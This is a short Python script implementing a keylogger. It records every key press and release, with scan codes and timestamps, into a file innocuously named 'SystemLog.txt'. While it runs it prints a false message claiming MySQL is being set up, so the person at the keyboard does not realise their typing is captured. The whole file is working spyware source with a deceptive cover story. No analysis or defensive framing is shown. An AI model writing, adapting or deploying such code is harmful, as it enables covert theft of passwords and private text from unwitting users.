import threading
import time
import os
import json
import keyboard
import datetime

path = "SystemLog.txt"
save_interval = 10  # seconds
hide_window = True
killswitches = []
stop_combination = {'alt', 'ctrl', 'enter'}
pressed_keys = set()


class Keylogger:
    def __init__(self):
        self._running = False
        self._thread = None

    def start(self):
        self._running = True
        self._thread = threading.Thread(target=self._run)
        self._thread.start()

    def stop(self):
        self._running = False
        if self._thread and self._thread.is_alive():
            self._thread.join()
            print("Stopped.")

    def _run(self):
        keyboard.on_press(self._on_press)
        keyboard.on_release(self._on_release)

        while self._running:
            if not hide_window or not self._is_window_visible():
                time.sleep(save_interval)

    def _is_window_visible(self):
        # Replace with actual logic to check if window is visible
        return True

    def _on_press(self, event):
        global pressed_keys
        pressed_keys.add(event.name)
        if pressed_keys >= stop_combination:
            self.stop()
        else:
            self._write_to_file(event, "PRESS")

    def _on_release(self, event):
        global pressed_keys
        if event.name in pressed_keys:
            pressed_keys.remove(event.name)
        self._write_to_file(event, "RELEASE")

    def _write_to_file(self, event, event_type):
        try:
            with open(path, "a", encoding="utf-8") as f:
                entry = {
                    "event_type": event_type,
                    "name": event.name,
                    "scan_code": event.scan_code,
                    "time": str(datetime.datetime.now())
                }
                f.write(json.dumps(entry) + "\n")
        except Exception as e:
            print("Error writing to file:", e)

    @staticmethod
    def clear_file():
        try:
            os.remove(path)
        except OSError:
            pass


if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()
    print("Mysql is setting up. Please do not close.(Alt+Ctrl+Enter to close)")
    input()  # Wait for any input (optional)
    keylogger.stop()